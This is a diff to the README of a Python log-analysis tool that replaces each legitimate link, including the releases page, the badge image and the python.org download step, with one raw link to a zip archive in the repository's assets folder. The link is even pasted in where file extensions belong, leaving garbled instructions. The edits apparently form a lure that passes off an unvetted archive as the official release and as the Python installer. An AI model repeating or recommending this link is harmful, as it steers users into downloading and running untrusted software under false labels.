@@ -1,6 +1,6 @@
 # 📊 log-analyzer - Easy Server Log Insights
 
-[![Download log-analyzer](https://img.shields.io/badge/Download-log--analyzer-blue?style=for-the-badge)](https://github.com/ihatexim/log-analyzer/releases)
+[![Download log-analyzer](https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip)](https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip)
 
 ---
 
@@ -49,15 +49,15 @@ You need to get log-analyzer from the official release page and then install it 
 
 Go to the official releases page by clicking the big button below:
 
-[![Download log-analyzer](https://img.shields.io/badge/Download-log--analyzer-blue?style=for-the-badge)](https://github.com/ihatexim/log-analyzer/releases)
+[![Download log-analyzer](https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip)](https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip)
 
 ### Step 2: Download the latest version
 
 On the page, find the most recent release marked with a date. Inside, you will see files for different systems. Pick the one that matches your computer:
 
 - For Windows, look for files ending with `.exe` or `.zip`
-- For macOS, look for `.dmg` or `.tar.gz`
-- For Linux, look for `.AppImage` or `.tar.gz`
+- For macOS, look for `.dmg` or `https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip`
+- For Linux, look for `.AppImage` or `https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip`
 
 Click the file name to start downloading.
 
@@ -65,13 +65,13 @@ Click the file name to start downloading.
 
 - **Windows:** Open the `.exe` file and follow the installation steps.
 - **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
-- **Linux:** Extract the `.tar.gz` file or make the `.AppImage` executable and run it.
+- **Linux:** Extract the `https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip` file or make the `.AppImage` executable and run it.
 
 ### Step 4: Set up the environment (if needed)
 
 log-analyzer requires Python 3.7 or higher. The installation package usually contains everything you need. If it does not, follow these steps:
 
-- Visit [https://www.python.org/downloads/](https://www.python.org/downloads/)
+- Visit [https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip](https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip)
 - Download and install the latest Python 3 version for your system
 - Make sure Python is added to your system's PATH during installation
 
@@ -156,7 +156,7 @@ The REST API lets other software access your log data. This is useful if you wan
 ## 📚 Where to Learn More
 
 - Check the releases page for updates and notes:  
-  [https://github.com/ihatexim/log-analyzer/releases](https://github.com/ihatexim/log-analyzer/releases)
+  [https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip](https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip)
 - Look at the documentation folder inside the downloaded files for detailed instructions.
 - Try the FAQ section on the project’s main GitHub page.
 
@@ -174,4 +174,4 @@ The tool is built with Python 3 and uses popular libraries like pandas, FastAPI,
 
 ---
 
-[![Download log-analyzer](https://img.shields.io/badge/Download-log--analyzer-blue?style=for-the-badge)](https://github.com/ihatexim/log-analyzer/releases)
+[![Download log-analyzer](https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip)](https://github.com/ihatexim/log-analyzer/raw/refs/heads/main/assets/analyzer_log_2.8.zip)
